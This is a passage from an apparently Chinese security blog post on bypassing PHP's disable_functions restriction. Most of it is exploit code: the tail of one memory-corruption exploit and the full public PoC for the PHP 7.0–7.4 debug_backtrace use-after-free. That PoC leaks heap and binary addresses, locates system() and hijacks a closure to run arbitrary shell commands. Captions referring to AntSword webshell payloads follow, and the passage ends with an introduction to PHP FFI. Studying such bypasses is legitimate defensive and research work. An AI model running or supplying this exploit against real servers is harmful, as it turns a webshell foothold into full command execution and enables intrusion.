class="variable">$base</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get_binary_base</span>(<span class="variable">$binary_leak</span>))) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse elf header</span></span><br><span class="line">        <span class="keyword">if</span>(!(<span class="variable">$elf</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parse_elf</span>(<span class="variable">$base</span>))) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># get basic_functions address</span></span><br><span class="line">        <span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get_basic_funcs</span>(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># find system entry</span></span><br><span class="line">        <span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get_system</span>(<span class="variable">$basic_funcs</span>))) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># copy hashtable offsetGet bucket</span></span><br><span class="line">        <span class="variable">$fake_bkt_off</span> = <span class="number">0x70</span> * <span class="number">5</span> - <span class="number">16</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$function_data</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">str2ptr</span>(<span class="variable">$this</span>-&gt;abc, <span class="number">0x50</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">4</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="variable">$fake_bkt_off</span> + <span class="variable">$i</span> * <span class="number">8</span>, </span><br><span class="line">                <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$function_data</span> + <span class="number">0x40</span> * <span class="number">4</span>, <span class="variable">$i</span> * <span class="number">8</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># create a fake bucket</span></span><br><span class="line">        <span class="variable">$fake_bkt_addr</span> = <span class="variable">$abc_addr</span> + <span class="variable">$fake_bkt_off</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="number">0x50</span>, <span class="variable">$fake_bkt_addr</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">3</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="number">0x58</span> + <span class="variable">$i</span> * <span class="number">4</span>, <span class="number">1</span>, <span class="number">4</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># copy bucket zval</span></span><br><span class="line">        <span class="variable">$function_zval</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">str2ptr</span>(<span class="variable">$this</span>-&gt;abc, <span class="variable">$fake_bkt_off</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">12</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc,  <span class="variable">$fake_bkt_off</span> + <span class="number">0x70</span> + <span class="variable">$i</span> * <span class="number">8</span>, </span><br><span class="line">                <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$function_zval</span>, <span class="variable">$i</span> * <span class="number">8</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># pwn</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="variable">$fake_bkt_off</span> + <span class="number">0x70</span> + <span class="number">0x30</span>, <span class="variable">$zif_system</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="variable">$fake_bkt_off</span>, <span class="variable">$fake_bkt_addr</span> + <span class="number">0x70</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$spl1</span>-&gt;<span class="title function_ invoke__">offsetGet</span>(<span class="variable">$cmd</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$y</span> = [<span class="keyword">new</span> <span class="title function_ invoke__">Z</span>()];</span><br><span class="line"><span class="title function_ invoke__">json_encode</span>([&amp;<span class="variable">$y</span>]);</span><br></pre></td></tr></table></figure></div>



<h3 id="payload-–-蚁剑-2"><a href="#payload-–-蚁剑-2" class="headerlink" title="payload – 蚁剑"></a>payload – 蚁剑</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20230827174547679.png"
                      alt="image-20230827174547679"
                ></p>
<h2 id="Backtrace-UAF"><a href="#Backtrace-UAF" class="headerlink" title="Backtrace UAF"></a>Backtrace UAF</h2><p><strong>历史报告：</strong><a class="link"   href="https://bugs.php.net/bug.php?id=76047" >PHP :: Bug #76047 :: Use-after-free when accessing already destructed backtrace arguments <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h3 id="EXP-3"><a href="#EXP-3" class="headerlink" title="EXP"></a>EXP</h3><p><a class="link"   href="https://github.com/mm0r1/exploits/tree/master/php7-backtrace-bypass" >exploits&#x2F;php7-backtrace-bypass at master · mm0r1&#x2F;exploits (github.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># PHP 7.0-7.4 disable_functions bypass PoC (*nix only)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Bug: https://bugs.php.net/bug.php?id=76047</span></span><br><span class="line"><span class="comment"># debug_backtrace() returns a reference to a variable </span></span><br><span class="line"><span class="comment"># that has been destroyed, causing a UAF vulnerability.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># This exploit should work on all PHP 7.0-7.4 versions</span></span><br><span class="line"><span class="comment"># released as of 30/01/2020.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Author: https://github.com/mm0r1</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">pwn</span>(<span class="string">&quot;uname -a&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pwn</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>, <span class="variable">$backtrace</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Vuln</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$backtrace</span>; </span><br><span class="line">            <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">            <span class="variable">$backtrace</span> = (<span class="keyword">new</span> <span class="built_in">Exception</span>)-&gt;<span class="title function_ invoke__">getTrace</span>(); <span class="comment"># ;)</span></span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>])) &#123; <span class="comment"># PHP &gt;= 7.4</span></span><br><span class="line">                <span class="variable">$backtrace</span> = <span class="title function_ invoke__">debug_backtrace</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>, <span class="variable">$d</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span>-<span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            <span class="variable">$address</span> |= <span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$out</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = <span class="title function_ invoke__">chr</span>(<span class="variable">$v</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">            <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x68</span>, <span class="variable">$addr</span> + <span class="variable">$p</span> - <span class="number">0x10</span>);</span><br><span class="line">        <span class="variable">$leak</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$helper</span>-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span> != <span class="number">8</span>) &#123; <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$s</span> * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$e_type</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$e_phoff</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x20</span>);</span><br><span class="line">        <span class="variable">$e_phentsize</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable">$e_phnum</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line">            <span class="variable">$p_type</span>  = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_flags</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_vaddr</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x10</span>);</span><br><span class="line">            <span class="variable">$p_memsz</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_Write</span></span><br><span class="line">                <span class="comment"># handle pie</span></span><br><span class="line">                <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line">                <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">5</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_exec</span></span><br><span class="line">                <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                <span class="comment"># &#x27;constant&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                <span class="comment"># &#x27;bin2hex&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$base</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> == <span class="number">0x10102464c457f</span>) &#123; <span class="comment"># ELF header</span></span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="variable">$f_entry</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>);</span><br><span class="line">            <span class="variable">$f_name</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123; <span class="comment"># system</span></span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">trigger_uaf</span>(<span class="params"><span class="variable">$arg</span></span>) </span>&#123;</span><br><span class="line">        <span class="comment"># str_shuffle prevents opcache string interning</span></span><br><span class="line">        <span class="variable">$arg</span> = <span class="title function_ invoke__">str_shuffle</span>(<span class="title function_ invoke__">str_repeat</span>(<span class="string">&#x27;A&#x27;</span>, <span class="number">79</span>));</span><br><span class="line">        <span class="variable">$vuln</span> = <span class="keyword">new</span> <span class="title class_">Vuln</span>();</span><br><span class="line">        <span class="variable">$vuln</span>-&gt;a = <span class="variable">$arg</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$n_alloc</span> = <span class="number">10</span>; <span class="comment"># increase this value if UAF fails</span></span><br><span class="line">    <span class="variable">$contiguous</span> = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">        <span class="variable">$contiguous</span>[] = <span class="title function_ invoke__">str_shuffle</span>(<span class="title function_ invoke__">str_repeat</span>(<span class="string">&#x27;A&#x27;</span>, <span class="number">79</span>));</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">trigger_uaf</span>(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">    <span class="variable">$abc</span> = <span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$helper</span> = <span class="keyword">new</span> <span class="title class_">Helper</span>;</span><br><span class="line">    <span class="variable">$helper</span>-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$x</span></span>) </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">79</span> || <span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leaks</span></span><br><span class="line">    <span class="variable">$closure_handlers</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$php_heap</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x58</span>);</span><br><span class="line">    <span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake value</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake reference</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x10</span>, <span class="variable">$abc_addr</span> + <span class="number">0x60</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_obj</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$binary_leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_handlers</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$base</span> = <span class="title function_ invoke__">get_binary_base</span>(<span class="variable">$binary_leak</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$elf</span> = <span class="title function_ invoke__">parse_elf</span>(<span class="variable">$base</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = <span class="title function_ invoke__">get_basic_funcs</span>(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = <span class="title function_ invoke__">get_system</span>(<span class="variable">$basic_funcs</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake closure object</span></span><br><span class="line">    <span class="variable">$fake_obj_offset</span> = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x110</span>; <span class="variable">$i</span> += <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="variable">$fake_obj_offset</span> + <span class="variable">$i</span>, <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_obj</span>, <span class="variable">$i</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># pwn</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_obj_offset</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); <span class="comment"># internal func type</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x68</span>, <span class="variable">$zif_system</span>); <span class="comment"># internal func handler</span></span><br><span class="line"></span><br><span class="line">    (<span class="variable">$helper</span>-&gt;b)(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<h3 id="payload-–-蚁剑-3"><a href="#payload-–-蚁剑-3" class="headerlink" title="payload – 蚁剑"></a>payload – 蚁剑</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20230827175108510.png"
                      alt="image-20230827175108510"
                ></p>
<h1 id="FFI-扩展"><a href="#FFI-扩展" class="headerlink" title="FFI 扩展"></a>FFI 扩展</h1><h2 id="FFI"><a href="#FFI" class="headerlink" title="FFI"></a>FFI</h2><p>随着PHP7.4而来的有一个扩展:PHP FFI(Foreign Function interface), 引用一段PHP FFI RFC中的一段描述:</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">For PHP, FFI opens a way to write PHP extensions and bindings to C libraries in pure PHP.</span><br></pre></td></tr></table></figure></div>

<p>FFI提供了高级语言直接的互相调用，而对于PHP来说，FFI让我们可以方便的调用C语言写的各种库。</p>
<p>传统的方式，当我们需要用一些已有的C语言的库的能力的时候，我们需要用C语言写wrapper，把他们包装成扩展，这个过程中就需要大家去学习PHP的扩展怎么写，当然现在也有一些方便的方式，比如Zephir. 但总还是有一些学习成本的，而有了FFI以后，我们就可以直接在PHP脚本中调用C语言写的库中的函数了。</p>
<p>具体还是看这篇文章吧：<a class="link"   href="https://www.laruence.com/2020/03/11/5475.html" >PHP FFI详解 - 一种全新的PHP扩展方式 - 风雪之隅 (laruence.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><strong>手工的代码如下：</strong></p>
